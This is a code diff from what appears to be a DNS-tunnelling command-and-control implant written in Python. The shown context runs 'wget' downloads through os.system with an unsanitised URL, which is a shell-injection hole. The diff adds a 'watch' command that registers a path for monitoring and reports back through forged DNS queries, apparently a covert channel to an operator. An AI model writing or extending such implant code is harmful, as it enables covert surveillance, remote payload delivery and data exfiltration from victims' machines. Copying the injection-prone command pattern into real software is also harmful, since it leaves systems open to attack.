@@ -146,11 +146,16 @@ def execute_wget_command(url: str, filepath: str) -> bool:
     os.system(f"wget {url} -P {filepath}")
     return True
 
+
 def execute_watch_command(path: str) -> bool:
     if not os.path.exists(path):
         query = forge_dns_query(data=f"ERRORMSG: Path: {path} does not exist.")
         send_dns_query(query)
         return False
+    # Register the path to monitor.
+    MONITOR.monitor(path)
+    query = forge_dns_query(data=f"Path '{path}' will be monitored.")
+    send_dns_query(query)
     return True
 
 
